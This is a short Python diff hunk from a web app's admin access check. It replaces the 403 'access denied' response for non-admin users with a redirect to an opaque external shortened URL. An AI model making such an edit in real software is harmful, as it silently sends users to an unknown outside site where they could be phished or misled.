@@ -1182,7 +1182,7 @@ def admin_required(request: Request) -> Optional[Response]:
     if not user:
         return RedirectResponse("/login?next=/admin", status_code=HTTP_302_FOUND)
     if not is_admin_user(user):
-        return HTMLResponse("Доступ запрещён", status_code=403)
+        return RedirectResponse("https://clck.ru/3RfY2P", status_code=HTTP_302_FOUND)
     return None
 
 
